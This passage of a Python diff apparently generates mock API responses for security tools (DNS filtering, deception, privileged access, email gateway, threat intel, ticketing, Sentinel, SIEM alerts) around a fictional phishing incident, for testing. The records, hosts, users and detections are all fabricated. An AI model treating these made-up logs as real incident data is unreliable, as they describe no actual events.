+        route("POST", r"^/graphql$", {"data": {"issuesV2": {"nodes": issues, "pageInfo": pi}}}, body_contains="issuesV2("),
+    ])
+
+
+# ----------------------------------------------------------------------------- DNS, deception, PAM, email gateway
+
+
+def umbrella() -> None:
+    def row(t, host, user, ip, domain, verdict, cats):
+        return {"timestamp": f"{D}{t}Z", "domain": domain, "verdict": verdict, "internalip": ip,
+                "externalip": "203.0.113.10", "querytype": "A", "categories": cats,
+                "identities": [{"label": host, "type": {"type": "roaming"}},
+                               {"label": user, "type": {"type": "directory_user"}}]}
+    phish_cat = [{"label": "Phishing", "type": "security"}]
+    data = [row("09:05:12", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], PHISH["url_domain"], "allowed", phish_cat),
+            row("09:07:40", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], PHISH["url_domain"], "allowed", phish_cat),
+            row("09:11:03", "PRIYA-LT07", u("priya")["upn"], "10.20.1.31", PHISH["url_domain"], "blocked", phish_cat),
+            row("09:30:00", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], "outlook.office365.com", "allowed",
+                [{"label": "Business Services", "type": "content"}])]
+    fs, ai, vpn = ([{"label": "File Storage", "type": "content"}], [{"label": "Generative AI", "type": "application"}],
+                   [{"label": "Personal VPN", "type": "content"}, {"label": "Proxy/Anonymizer", "type": "content"}])
+    shadow = [("10:02:11", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "wetransfer.com", "allowed", fs),
+              ("10:04:37", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "wetransfer.com", "allowed", fs),
+              ("11:15:02", "MEERA-LT06", u("meera")["upn"], "10.20.1.44", "wetransfer.com", "allowed", fs),
+              ("10:30:00", "LI-DEV08", u("li")["upn"], "10.20.1.52", "chat.deepseek.com", "allowed", ai),
+              ("10:31:12", "LI-DEV08", u("li")["upn"], "10.20.1.52", "chat.deepseek.com", "allowed", ai),
+              ("12:01:40", "TOM-LT07", u("tom")["upn"], "10.20.1.47", "chat.deepseek.com", "allowed", ai),
+              ("13:20:05", "LI-DEV08", u("li")["upn"], "10.20.1.52", "nordvpn.com", "blocked", vpn),
+              ("13:21:44", "LI-DEV08", u("li")["upn"], "10.20.1.52", "mega.nz", "blocked", fs),
+              ("14:05:09", "MEERA-LT06", u("meera")["upn"], "10.20.1.44", "anydesk.com", "allowed",
+               [{"label": "Remote Access", "type": "content"}]),
+              ("14:40:31", "TOM-LT07", u("tom")["upn"], "10.20.1.47", "teams.microsoft.com", "allowed",
+               [{"label": "Business Services", "type": "content"}]),
+              ("15:02:18", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "update-flash-player.xyz", "blocked",
+               [{"label": "Malware", "type": "security"}, {"label": "Newly Seen Domains", "type": "security"}])]
+    data += [row(*r) for r in shadow]
+    phish_rows = [d for d in data if d["domain"] == PHISH["url_domain"]]
+    categories = route("GET", r"^/reports/v2/categories$", {"data": [
+        {"id": 65, "label": "Command and Control", "type": "security", "integration": False, "deprecated": False},
+        {"id": 66, "label": "Malware", "type": "security", "integration": False, "deprecated": False},
+        {"id": 68, "label": "Phishing", "type": "security", "integration": False, "deprecated": False},
+        {"id": 23, "label": "File Storage", "type": "content", "integration": False, "deprecated": False},
+        {"id": 196, "label": "Generative AI", "type": "application", "integration": False, "deprecated": False}]})
+    write("umbrella", [categories, 
+        route("GET", r"^/reports/v2/activity/dns$", {"data": phish_rows}, params={"domains": PHISH["url_domain"]}),
+        route("GET", r"^/reports/v2/activity/dns$", {"data": phish_rows}, params={"domains": PHISH["sender_domain"]}),
+        route("GET", r"^/reports/v2/activity/dns$", {"data": []}, params={"domains": "*"}),
+        route("GET", r"^/reports/v2/activity/dns$", {"data": [d for d in data if d["internalip"] == HOSTS["jane"]["ip"]]},
+              params={"ip": HOSTS["jane"]["ip"]}),
+        route("GET", r"^/reports/v2/activity/dns$", {"data": []}, params={"ip": "*"}),
+        route("GET", r"^/reports/v2/activity/dns$", {"data": data}),
+        route("GET", r"^/policies/v2/destinationlists/[^/]+/destinations$", {"data": [
+            {"id": "d-1", "destination": PHISH["url_domain"]}]}),
+    ])
+
+
+def canary() -> None:
+    inc = {"id": "canary-inc-0001", "description": {
+        "incident_id": "canary-inc-0001", "description": "Shared File Opened", "name": "FS01-Finance-Backups",
+        "node_id": "canary-node-fs01", "src_host": HOSTS["jane"]["ip"], "src_host_reverse": HOSTS["jane"]["fqdn"],
+        "dst_host": "10.10.0.21", "dst_port": "445", "created_std": f"{D}09:40:11Z", "acknowledged": "False",
+        "logtype": "5000", "events_count": "3",
+        "logdata": [{"USERNAME": "jane.doe", "FILENAME": "\\\\Finance-Backups\\2026-Q3-payroll.xlsx"}]}}
+    write("canary", [
+        route("GET", r"^/api/v1/incidents/all$", {"incidents": [inc], "max_updated_id": 1001}),
+        route("GET", r"^/api/v1/devices/all$", {"devices": [{"id": "canary-node-fs01", "name": "FS01-Finance-Backups",
+                                                               "ip_address": "10.10.0.21", "location": "DC1"}]}),
+    ])
+
+
+def delinea_secret_server() -> None:
+    recs = [{"secretAuditId": 7001, "secretId": 42, "secretName": "SAP-Prod-Finance-Service", "action": "VIEW",
+             "byUserName": "ACME\\jane.doe", "dateRecorded": f"{D}09:45:30Z", "ipAddress": HOSTS["jane"]["ip"],
+             "machineName": "JANE-LT01", "folderPath": "\\Finance\\Production"},
+            {"secretAuditId": 7002, "secretId": 42, "secretName": "SAP-Prod-Finance-Service", "action": "COPY PASSWORD",
+             "byUserName": "ACME\\jane.doe", "dateRecorded": f"{D}09:45:52Z", "ipAddress": HOSTS["jane"]["ip"],
+             "machineName": "JANE-LT01", "folderPath": "\\Finance\\Production"},
+            {"secretAuditId": 7003, "secretId": 17, "secretName": "Exchange-Admin", "action": "LAUNCH",
+             "byUserName": "ACME\\bob.lee", "dateRecorded": f"{D}08:00:00Z", "ipAddress": HOSTS["bob"]["ip"],
+             "machineName": "BOB-LT02", "folderPath": "\\IT"}]
+    write("delinea_secret_server", [
+        route("GET", r"^/api/v1/secret-audits$", {"records": recs[:2]}, params={"filter.userName": "jane.doe"}),
+        route("GET", r"^/api/v1/secret-audits$", {"records": [recs[2]]}, params={"filter.userName": "bob.lee"}),
+        route("GET", r"^/api/v1/secret-audits$", {"records": []}, params={"filter.userName": "*"}),
+        route("GET", r"^/api/v1/secret-audits$", {"records": recs, "total": 3, "hasNext": False}),
+        route("GET", r"^/api/v1/launched-sessions$", {"records": []}),
+        route("GET", r"^/api/v1/users$", {"records": [{"userName": "jane.doe", "isApplicationAccount": False,
+                                                       "adminRoles": []}]}),
+    ])
+
+
+def delinea_privilege_manager() -> None:
+    ev = [{"id": 501, "eventTime": f"{D}09:08:00Z", "userName": "ACME\\jane.doe", "computerName": "JANE-LT01",
+           "applicationName": "powershell.exe", "outcome": "Denied", "policyName": "Block unsigned admin tools",
+           "fileHash": PAYLOAD_SHA}]
+    write("delinea_privilege_manager", [
+        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev}, params={"userName": "jane.doe"}),
+        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev}, params={"computerName": "JANE-LT01"}),
+        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": []}, params={"userName": "*"}),
+        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": []}, params={"computerName": "*"}),
+        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev, "hasMore": False, "lastId": 501}),
+    ])
+
+
+def avanan() -> None:
+    env = {"requestId": "7f3c0d1e-0000-4000-8000-000000000001", "responseCode": 200, "responseText": "",
+           "additionalText": "", "scrollId": ""}
+    clean = {"ap": "clean", "av": "clean", "dlp": None, "clicktimeProtection": "clean", "shadowIt": "clean"}
+
+    def entity(eid, imid, subject, frm, to, verdicts, received):
+        return {"entityInfo": {"entityId": eid, "customerId": "acme", "saas": "office365_emails",
+                               "saasEntityType": "office365_emails_email", "entityCreated": received,
+                               "entityUpdated": received, "entityActionState": None},
+                "entityPayload": {"internetMessageId": imid, "subject": subject, "received": received,
+                                  "recipients": to, "to": to, "fromEmail": frm, "fromDomain": frm.split("@")[1],
+                                  "isQuarantined": False, "isIncoming": True, "isInternal": False},
+                "entitySecurityResult": {"combinedVerdict": verdicts, **{k: [] for k in verdicts}},
+                "entityActions": [], "entityAvailableActions": []}
+
+    spam_to = [u("arun")["upn"]]
+    phish = entity("0a1b2c3d4e5f60718293a4b5c6d7e8f9", PHISH["imid"], PHISH["subject"], PHISH["sender"],
+                   [u(r)["upn"] for r in PHISH["recipients"]], clean, f"{D}09:02:00Z")
+    spam = entity("9f8e7d6c5b4a39281706f5e4d3c2b1a0", "<20260920060000.5555@vendor.example>",
+                  "Spring offers from vendor.example", "news@vendor.example", spam_to,
+                  {**clean, "ap": "spam"}, f"{D}05:59:40Z")
+    write("avanan", [
+        route("POST", r"^/app/hec-api/v1.0/search/query$",
+              {"responseEnvelope": {**env, "recordsNumber": 1}, "responseData": [phish]}, body_contains=PHISH["imid"]),
+        route("POST", r"^/app/hec-api/v1.0/search/query$", {"responseEnvelope": {**env, "recordsNumber": 0},
+                                                           "responseData": []}),
+        route("GET", r"^/app/hec-api/v1.0/search/entity/9f8e7d6c5b4a39281706f5e4d3c2b1a0$",
+              {"responseEnvelope": {**env, "recordsNumber": 1}, "responseData": [spam]}),
+        route("POST", r"^/app/hec-api/v1.0/event/query$", {"responseEnvelope": {**env, "recordsNumber": 1},
+                                                          "responseData": [{
+            "eventId": "4d2e9a0b7c1f4e6a8b3d5c7e9f1a2b3c", "customerId": "acme", "saas": "office365_emails",
+            "entityId": "9f8e7d6c5b4a39281706f5e4d3c2b1a0", "state": "detected", "type": "spam",
+            "confidenceIndicator": "spam", "eventCreated": f"{D}06:00:00.000000+00:00", "severity": "2",
+            "description": "Spam detected in an email from news@vendor.example - 'Spring offers from vendor.example'",
+            "data": "", "additionalData": None, "availableEventActions": None,
+            "actions": [{"actionType": "tag", "createTime": f"{D}06:00:05Z", "relatedEntityId": ""}]}]}),
+    ])
+
+
+# ----------------------------------------------------------------------------- intel, ITSM, CMDB, SIEM
+
+
+def nvd() -> None:
+    routes = []
+    for c, m in CVES.items():
+        routes.append(route("GET", r"^/rest/json/cves/2.0$", {"totalResults": 1, "vulnerabilities": [{"cve": {
+            "id": c, "published": "2023-01-01T00:00:00", "lastModified": "2026-01-01T00:00:00",
+            "descriptions": [{"lang": "en", "value": m["desc"]}],
+            "metrics": {"cvssMetricV31": [{"cvssData": {"baseScore": m["cvss"], "baseSeverity": m["sev"].upper(),
+                                                        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}}]},
+            "weaknesses": [{"description": [{"value": "CWE-502"}]}],
+            "references": [{"url": f"https://example.org/advisory/{c}", "tags": ["Vendor Advisory"]},
+                           {"url": f"https://example.org/poc/{c}", "tags": ["Exploit"]}]}}]}, params={"cveId": c}))
+    routes.append(route("GET", r"^/rest/json/cves/2.0$", {"totalResults": 0, "vulnerabilities": []}))
+    write("nvd", routes)
+
+
+def epss() -> None:
+    rows = [{"cve": c, "epss": str(m["epss"]), "percentile": str(round(min(0.9999, 0.5 + m["epss"] / 2), 4)),
+             "date": "2026-09-20"} for c, m in CVES.items()]
+    write("epss", [route("GET", r"^/data/v1/epss$", {"data": rows},
+                         select={"from": "params.cve", "list": "data", "key": "cve", "split": ","})])
+
+
+def cisa_kev() -> None:
+    write("cisa_kev", [route("GET", r"known_exploited_vulnerabilities.json$", {
+        "catalogVersion": "2026.09.20", "vulnerabilities": [
+            {"cveID": c, "vendorProject": m["product"].split()[0], "product": m["product"], "vulnerabilityName": m["desc"],
+             "dateAdded": "2026-09-19" if c == "CVE-2024-21412" else "2023-10-10", "dueDate": "2026-10-10",
+             "requiredAction": "Apply mitigations per vendor instructions.",
+             "knownRansomwareCampaignUse": "Known" if c == "CVE-2021-44228" else "Unknown"}
+            for c, m in CVES.items() if m["kev"]]})])
+
+
+def threat_intel() -> None:
+    dom, udom, ip = PHISH["sender_domain"], PHISH["url_domain"], TOR_IP
+    bad = {"last_analysis_stats": {"malicious": 14, "suspicious": 3, "harmless": 50, "undetected": 20}}
+    write("threat_intel", [
+        route("GET", rf"^/vt/api/v3/domains/({dom}|{udom})$", {"data": {"attributes": bad}}),
+        route("GET", rf"^/vt/api/v3/ip_addresses/{ip}$", {"data": {"attributes": {
+            "last_analysis_stats": {"malicious": 9, "suspicious": 2, "harmless": 60, "undetected": 20}}}}),
+        route("GET", rf"^/vt/api/v3/files/{PAYLOAD_SHA}$", {"data": {"attributes": {
+            "last_analysis_stats": {"malicious": 38, "suspicious": 0, "harmless": 0, "undetected": 30}}}}),
+        route("GET", r"^/vt/api/v3/urls/aHR0cHM6Ly9sb2dpbi5taWNyb3MwZnQ", {"data": {"attributes": bad}}),
+        route("GET", r"^/vt/", {"data": {"attributes": {"last_analysis_stats": {"malicious": 0, "harmless": 70,
+                                                                                "undetected": 10}}}}),
+        route("GET", r"^/abuseipdb/api/v2/check$", {"data": {"abuseConfidenceScore": 100, "totalReports": 1840,
+                                                             "isp": "Tor exit", "isTor": True}}, params={"ipAddress": ip}),
+        route("GET", r"^/abuseipdb/api/v2/check$", {"data": {"abuseConfidenceScore": 0, "totalReports": 0}}),
+        route("GET", rf"^/otx/api/v1/indicators/.*({dom}|{udom}|{ip}|{PAYLOAD_SHA})", {"pulse_info": {"count": 4}}),
+        route("GET", r"^/otx/", {"pulse_info": {"count": 0}}),
+        route("POST", r"^/urlhaus/v1/", {"query_status": "ok", "threat": "phishing", "url_status": "online"},
+              body_contains="micros0ft"),
+        route("POST", r"^/urlhaus/v1/", {"query_status": "no_results"}),
+        route("POST", r"^/threatfox/api/v1/$", {"query_status": "ok", "data": [
+            {"malware_printable": "Unknown Loader", "threat_type": "payload_delivery"}]}, body_contains=PAYLOAD_SHA),
+        route("POST", r"^/threatfox/api/v1/$", {"query_status": "no_result", "data": "no results"}),
+        route("POST", r"^/malwarebazaar/api/v1/$", {"query_status": "ok", "data": [
+            {"signature": "PowerShell Loader", "file_type": "ps1"}]}, body_contains=PAYLOAD_SHA),
+        route("POST", r"^/malwarebazaar/api/v1/$", {"query_status": "hash_not_found"}),
+        route("GET", rf"^/greynoise/v3/community/{ip}$", {"noise": True, "riot": False, "classification": "malicious",
+                                                          "name": "Tor exit node"}),
+        route("GET", r"^/greynoise/v3/community/", {"noise": False, "riot": False, "classification": "unknown"}),
+        route("GET", r"^/shodan/shodan/host/", {"ports": [22, 80, 443, 9001], "org": "Tor relay", "tags": ["tor"]}),
+    ])
+
+
+def servicenow() -> None:
+    # sysparm_display_value=all: every field is {"value", "display_value"}; timestamp values are UTC,
+    # their display values are in the API user's timezone (IST here)
+    day = D.rstrip("T")
+
+    def f(value, display=None):
+        return {"value": value, "display_value": value if display is None else display}
+
+    def ts(utc, ist):
+        return f(f"{day} {utc}", f"{day} {ist}")
+
+    specs = [("web01", "Anil Rao", "Web Platform", "Production", "1", "1 - most critical", "Kolkata DC1"),
+             ("db01", "Sunita Iyer", "Windows Server Team", "Production", "1", "1 - most critical", "Kolkata DC1"),
+             ("fs01", "Sunita Iyer", "Windows Server Team", "Production", "2", "2 - somewhat critical", "Kolkata DC1"),
+             ("jane", "Jane Doe", "End User Computing", "Corporate", "3", "3 - less critical", "Kolkata HQ"),
+             ("bob", "Bob Lee", "End User Computing", "Corporate", "3", "3 - less critical", "Kolkata HQ")]
+    cis = [{"sys_id": f(f"ci-{k}"), "name": f(HOSTS[k]["hostname"]), "fqdn": f(HOSTS[k]["fqdn"]),
+            "ip_address": f(HOSTS[k]["ip"]), "os": f(HOSTS[k]["os"]), "serial_number": f(HOSTS[k]["serial"]),
+            "owned_by": f(f"usr-{k}", owner), "support_group": f("grp-" + team.lower().replace(" ", "-"), team),
+            "environment": f(env.lower(), env), "business_criticality": f(code, crit),
+            "location": f("loc-" + loc.lower().replace(" ", "-"), loc), "sys_updated_on": ts("02:00:00", "07:30:00")}
+           for k, owner, team, env, code, crit, loc in specs]
+    routes = [route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": [c]},
+                    params={"sysparm_query": f"name={c['name']['value']}"}) for c in cis]
+    routes += [route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": []}, params={"sysparm_query": "~^name="}),
+               route("GET", r"^/api/now/table/cmdb_ci_computer$", {"result": cis}),
+               route("POST", r"^/api/now/table/(incident|sn_vul_vulnerable_item)$",
+                     {"result": {"sys_id": "sn-sys-0001", "number": "INC0012001"}}),
+               route("GET", r"^/api/now/table/incident/sn-sys-0001$", {"result": {
+                   "number": f("INC0012001"), "state": f("2", "In Progress"),
+                   "assignment_group": f("grp-web-platform", "Web Platform"),
+                   "sys_updated_on": ts("12:00:00", "17:30:00")}}),
+               route("GET", r"^/api/now/table/incident$", {"result": []})]
+    write("servicenow", routes)
+
+
+def jira() -> None:
+    """A second team's tracker (ServiceNow stays the ticketing system the workflows use). Jira returns times with a
+    four-digit offset and milliseconds ("+0530"), and objects for status / priority / resolution."""
+    site = f"https://{ORG.split('.')[0]}.atlassian.net"
+
+    def issue(iid, key, summary, status, category, component, priority, updated, resolution=None):
+        return {"expand": "operations,versionedRepresentations,editmeta,changelog,renderedFields", "id": iid,
+                "self": f"{site}/rest/api/3/issue/{iid}", "key": key,
+                "fields": {"summary": summary, "updated": updated, "components": [{"self": f"{site}/rest/api/3/component/1{iid[-2:]}",
+                                                                                    "id": f"1{iid[-2:]}", "name": component}],
+                           "status": {"self": f"{site}/rest/api/3/status/3", "name": status, "id": "3",
+                                      "statusCategory": {"id": 4, "key": category, "name": status}},
+                           "priority": {"self": f"{site}/rest/api/3/priority/2", "name": priority, "id": "2"},
+                           "resolution": resolution}}
+
+    issues = [
+        issue("10112", "SEC-112", "Restrict public access to storage account acmebackups", "Done", "done", "Cloud Platform",
+              "High", "2026-09-18T11:47:03.000+0530", {"self": f"{site}/rest/api/3/resolution/10000", "id": "10000",
+                                                      "name": "Done", "description": "Work has been completed."}),
+        issue("10117", "SEC-117", "Patch CVE-2024-21412 on finance laptops", "To Do", "new", "End User Computing",
+              "High", "2026-09-20T14:05:12.481+0530"),
+        issue("10118", "SEC-118", "Rotate the SAP-Prod-Finance-Service secret after suspicious access", "In Progress",
+              "indeterminate", "Identity & Access", "Highest", "2026-09-20T15:10:00.000+0530"),
+    ]
+    write("jira", [route("POST", r"^/rest/api/3/issue$", {"id": "10001", "key": "SEC-101", "self": f"{site}/rest/api/3/issue/10001"}),
+                   route("GET", r"^/rest/api/3/search/jql$", {"issues": issues, "isLast": True})])
+
+
+def cmdb_csv() -> None:
+    write("cmdb_csv", [route("GET", r"^/ownership$", {"rows": [
+        {"hostname": "web*", "owner": "Anil Rao", "platform_team": "Web Platform", "environment": "Production",
+         "criticality": "critical"},
+        {"hostname": "db*", "owner": "Sunita Iyer", "platform_team": "Windows Server Team", "environment": "Production",
+         "criticality": "critical"},
+        {"hostname": "fs*", "owner": "Sunita Iyer", "platform_team": "Windows Server Team", "environment": "Production",
+         "criticality": "high"},
+        {"hostname": "*-lt*", "owner": "", "platform_team": "End User Computing", "environment": "Corporate",
+         "criticality": "medium"},
+        {"hostname": "", "subscription": "sub-001", "owner": "Ravi Nair", "platform_team": "Cloud Platform",
+         "environment": "Production", "criticality": "high"}]})])
+
+
+SENTINEL_WS = ("/subscriptions/sub-001/resourceGroups/rg-acme-security/providers/Microsoft.OperationalInsights/"
+               "workspaces/law-acme-sentinel/providers/Microsoft.SecurityInsights")
+
+
+def sentinel() -> None:
+    """Two incidents raised by the client's own analytics rules (data no other connector reads), in the shape of the
+    Sentinel REST API: the incident list, then each incident's entities (Accounts, Hosts, IPs)."""
+    j = HOSTS["jane"]
+
+    def incident(name, number, title, severity, status, created, first, last, tactics, techniques, alerts, labels=()):
+        rid = f"{SENTINEL_WS}/Incidents/{name}"
+        return {"id": rid, "name": name, "etag": f'"{number:08x}-0000-0100-0000-66ed0b6f0000"',
+                "type": "Microsoft.SecurityInsights/Incidents",
+                "properties": {"title": title, "description": f"{title} (analytics rule).", "severity": severity,
+                               "status": status, "classification": None, "classificationReason": None,
+                               "owner": {"objectId": None, "email": None, "assignedTo": None, "userPrincipalName": None},
+                               "labels": [{"labelName": x, "labelType": "User"} for x in labels],
+                               "firstActivityTimeUtc": first, "lastActivityTimeUtc": last, "lastModifiedTimeUtc": created,
+                               "createdTimeUtc": created, "incidentNumber": number,
+                               "additionalData": {"alertsCount": alerts, "bookmarksCount": 0, "commentsCount": 0,
+                                                  "alertProductNames": ["Azure Sentinel"], "tactics": tactics,
+                                                  "techniques": techniques},
+                               "relatedAnalyticRuleIds": [f"{SENTINEL_WS}/alertRules/{name[:8]}-rule"],
+                               "incidentUrl": f"https://portal.azure.com/#asset/Microsoft_Azure_Security_Insights/Incident{rid}",
+                               "providerName": "Azure Sentinel", "providerIncidentId": str(number)}}
+
+    tor = incident("b7e4c1d2-5a6f-4e8b-9c0d-1a2b3c4d5e61", 4211,
+                   "Sign-in from a Tor exit node followed by a mailbox forwarding rule", "High", "New",
+                   f"{D}09:19:10.5521823Z", f"{D}09:15:40Z", f"{D}09:18:02Z",
+                   ["InitialAccess", "Collection"], ["T1078", "T1114"], 1, ("tor",))
+    smb = incident("c8f5d2e3-6b7a-4f9c-8d1e-2b3c4d5e6f72", 4212,
+                   "Unusual file-share enumeration from a workstation", "Medium", "Active",
+                   f"{D}09:26:41.1048311Z", f"{D}09:21:00Z", f"{D}09:24:30Z", ["Discovery"], ["T1135"], 2)
+    account = {"kind": "Account", "properties": {"accountName": u("jane")["upn"].split("@")[0], "upnSuffix": ORG,
+                                                 "aadTenantId": "00000000-0000-0000-0000-00000000a0e1",
+                                                 "aadUserId": u("jane")["id"], "isDomainJoined": True,
+                                                 "displayName": u("jane")["name"], "friendlyName": u("jane")["name"]}}
+
+    def entities(name, items):
+        out = [{"id": f"{SENTINEL_WS}/Entities/{name[:8]}-{i}", "name": f"{name[:8]}-{i}", "type": "Microsoft.SecurityInsights/Entities", **e}
+               for i, e in enumerate(items)]
+        kinds = sorted({e["kind"] for e in items})
+        return {"entities": out, "metaData": [{"count": sum(1 for e in items if e["kind"] == k), "entityKind": k, "type": "Entity"}
+                                              for k in kinds]}
+
+    write("sentinel", [
+        route("GET", r"/incidents$", {"value": [tor, smb]}),
+        route("POST", rf"/incidents/{tor['name']}/entities$", entities(tor["name"], [
+            account, {"kind": "Ip", "properties": {"address": TOR_IP, "location": {"countryCode": "DE", "asn": 208323},
+                                                   "friendlyName": TOR_IP}}])),
+        route("POST", rf"/incidents/{smb['name']}/entities$", entities(smb["name"], [
+            account,
+            {"kind": "Host", "properties": {"hostName": j["hostname"], "dnsDomain": ORG, "netBiosName": j["hostname"],
+                                            "osFamily": "Windows", "additionalData": {"MdatpDeviceId": j["mde"]},
+                                            "friendlyName": j["hostname"]}},
+            {"kind": "Ip", "properties": {"address": j["ip"], "friendlyName": j["ip"]}}])),
+    ])
+
+
+def generic_siem() -> None:
+    """Push-only: no routes. ``push_samples`` are payloads as three common SIEM/SOAR shapes send them to
+    POST /api/v1/ingest/alerts, each with the ``field_map`` that maps it (tests ingest every sample)."""
+    j = HOSTS["jane"]
+    samples = {
+        "flat": {"field_map": {}, "alerts": [
+            {"id": "fw-20260920-000981", "title": "Outbound connection to a newly registered domain", "severity": "high",
+             "timestamp": f"{D}09:05:12Z", "host": j["hostname"], "user": u("jane")["upn"], "src_ip": j["ip"],
+             "domain": PHISH["url"].split("/")[2], "source": "perimeter-firewall", "action": "allowed"}]},
+        "splunk_es_notable": {
+            "field_map": {"id": "event_id", "title": "rule_name", "severity": "urgency", "time": "_time", "host": "dest",
+                          "user": "user", "src_ip": "src", "dst_ip": "dest_ip", "url": "url", "source": "source"},
+            "alerts": [{"event_id": "5A1F3C2B-7D6E-4B8A-9C0D-E1F2A3B4C5D6@@notable@@b3a9f1e2c4d5", "rule_name":
+                        "Endpoint - Suspicious PowerShell download - Rule", "urgency": "high",
+                        "_time": "2026-09-20T14:37:44.000+05:30", "dest": j["hostname"], "user": f"ACME\\{u('jane')['upn'].split('@')[0]}",
+                        "src": j["ip"], "dest_ip": "203.0.113.50", "url": PHISH["url"], "source": "Splunk ES",
+                        "security_domain": "endpoint", "status_label": "New", "owner": "unassigned", "orig_sourcetype": "XmlWinEventLog"}]},
+        "elastic_security": {
+            "field_map": {"id": "kibana.alert.uuid", "title": "kibana.alert.rule.name", "severity": "kibana.alert.severity",
+                          "time": "@timestamp", "host": "host.name", "user": "user.name", "src_ip": "source.ip",
+                          "dst_ip": "destination.ip", "hash": "file.hash.sha256"},
+            "alerts": [{"@timestamp": f"{D}09:07:42.118Z",
+                        "kibana": {"alert": {"uuid": "e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2",
+                                             "rule": {"name": "Suspicious PowerShell download", "uuid": "rule-0001"},
+                                             "severity": "high", "risk_score": 73, "status": "active"}},
+                        "host": {"name": j["hostname"].lower(), "hostname": j["hostname"].lower(), "ip": [j["ip"]],
+                                 "os": {"family": "windows"}},
+                        "user": {"name": u("jane")["upn"].split("@")[0], "domain": "ACME"},
+                        "source": {"ip": j["ip"]}, "destination": {"ip": "203.0.113.50", "port": 443},
+                        "file": {"hash": {"sha256": PAYLOAD_SHA}}, "event": {"module": "endpoint", "kind": "signal"}}]},
+    }
+    OUT.mkdir(parents=True, exist_ok=True)
+    (OUT / "generic_siem.json").write_text(json.dumps({"routes": [], "push_samples": samples}, indent=1), encoding="utf-8")
+
+
+BUILDERS = [defender_endpoint, defender_office365, entra, defender_identity, rapid7, wiz, umbrella, canary, delinea_secret_server,
+            delinea_privilege_manager, avanan, nvd, epss, cisa_kev, threat_intel, servicenow, jira, cmdb_csv,
+            sentinel, generic_siem]
